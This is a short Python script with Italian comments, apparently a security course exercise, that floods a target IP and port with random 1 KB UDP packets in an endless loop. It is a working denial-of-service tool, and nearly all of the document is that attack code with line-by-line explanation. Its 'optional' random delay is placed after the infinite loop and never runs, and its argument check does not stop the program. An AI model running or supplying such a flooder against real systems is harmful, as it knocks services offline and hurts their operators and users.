# Questo programma simula un attacco DoS di tipo UDP flood.
# Invia pacchetti UDP da 1KB a una macchina target 


import socket # serve a creare socket UDP (porta virtuale che usa User Datagram Protocol) per inviare pacchetti (dati)
import random # serve a generare bytes casuali per i pacchetti
import sys    # modulo che serve per interagire col Systema Operativo e la command line
import time   # modulo che permette di gestire il tempo (e.g. inserire ritardi tra i pacchetti per la parte facoltativa)


if len(sys.argv) != 3: # controllo di sicurezza per accertarci che ci siano esattamente 3 elementi nella lista (sys.argv)
    print("Uso: python3 W7D4_UDP_flood.py <IP_target> <Porta_target") # stampa la sintassi corretta con il nome del programma da eseguire e i 2 argomenti che ci servono per far funzionare il programma
                

target_ip = sys.argv[1]        # assegna alla variabile target_ip l'IP della macchina target ( 1 = primo argomento)
target_port = int(sys.argv[2]) # assegna alla variabile target_port il numero della porta della macchina target (2 = secondo argomento)
                               # dove int() converte il valore in un intero 


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # "s" è la variabile che conterrà l'oggetto socket UDP. 
                                                     # "socket.socket" crea un nuovo socket, cioè una porta virtuale per comunicare con un'altra macchina
                                                     # "socket.AF_INET" è un parametro che indica l'utilizzo di IPv4 
                                                     # "socket.SOCK_DGRAM" indica che il socket è di tipo UDP

packet = random._urandom(1024) # crea un pacchetto di dati casuali da 1 KB (1024 bytes) 

print(f"Inizio UDP flood verso {target_ip}:{target_port}...") # messaggio che informa l'utente che l'attacco simulato sta per partire

while True:          # loop infinito (la condizione è sempre vera) che manda pacchetti UDP alla macchina target fino a quando non viene interrotto manualmente 
    s.sendto(packet, (target_ip, target_port)) # serve a inviare il pacchetto da 1 KB all'indirizzo IP e porta specifici
    print(f"Inviato pacchetto a {target_ip}: {target_port}") # messaggio di conferma dell'invio del pacchetto


# Parte facoltativa:
# Possibilità di inserire un ritardo casuale tra l'invio dei pacchetti,
# utile per simulare un attacco meno costante ma piu realistico


time.sleep(random.uniform(0.01, 0.1)) # ferma il programma per un intervallo di tempo casuale (tra 0,01 e 0,1 secondi) 
                                      # prima di inviare il pacchetto successivo
                                      # in situaizoni realistiche i pacchetti subiscino ritardi nell'invio/ricezione per molte cause
                                      # tra cui il UDP stesso che non garantisce ne l'arrivo sicuro, ne l'ordine di arrivo (da priorità alla velocità di trasmissione)
                                      # ma anche interferenze di rete, prestazione dei dispositivi etc.


